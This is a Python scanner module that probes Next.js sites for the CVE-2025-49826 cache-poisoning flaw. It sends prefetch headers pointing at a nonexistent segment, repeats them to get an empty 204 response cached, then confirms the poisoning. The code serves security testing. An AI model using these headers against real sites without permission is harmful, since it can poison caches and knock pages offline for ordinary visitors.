#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
https://x.com/zhero___/status/1941593504901173250
https://github.com/vercel/next.js/security/advisories/GHSA-67rr-84xm-4c7r
Thanks Wlayzz for the PoC !
"""

from modules.utils import requests, random, sys, configure_logger, re, Identify, Colors
from urllib.parse import urljoin, urlparse

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def valid_cache(uri, req, req_h, headers):
    for _ in range(5):
        req_verify = requests.get(uri, headers=headers, verify=False, allow_redirects=False, timeout=10)
    req_confirm = requests.get(uri, verify=False, allow_redirects=False, timeout=10)
    if req_confirm.status_code == req_verify.status_code and req_confirm.status_code != req.status_code and req_confirm.status_code == 204:
        print(f" {Identify.confirmed} | CVE-2025-49826 | \033[34m{uri}\033[0m | {req.status_code} > {req_h.status_code} | PAYLOAD: {headers}")
    elif req_confirm.status_code == req_verify.status_code and req_confirm.status_code != req.status_code:
        print(f" {Identify.behavior} ++ | CVE-2025-49826 | \033[34m{uri}\033[0m | {req.status_code} > {req_h.status_code} | PAYLOAD: {headers}")
    else:
        print(f" {Identify.behavior} | CVE-2025-49826 | \033[34m{uri}\033[0m | {req.status_code} > {req_h.status_code} | PAYLOAD: {headers} ")


def nextjs_204(url):
    url = f"{url}?cve={random.randrange(99)}"
    uri = f"{url}{random.randrange(99)}"
    #sys.exit()
    headers = {
        "User-agent": "xxxxxxxx",
        "Rsc": "1",
        "Next-Router-Prefetch": "1",
        "Next-Router-Segment-Prefetch": "/nonexistent_segment"
    }
    try:
        req = requests.get(url, verify=False, allow_redirects=False, timeout=10)
        req_h = requests.get(uri, headers=headers, verify=False, allow_redirects=False, timeout=10)
        if req.status_code != req_h.status_code and req.status_code not in [403, 429]:
            valid_cache(uri, req, req_h, headers)
    except requests.Timeout:
        #print(f"request timeout {url} {p}")
        pass
    except KeyboardInterrupt:
        print("Exiting")
        sys.exit()
    except:
        pass
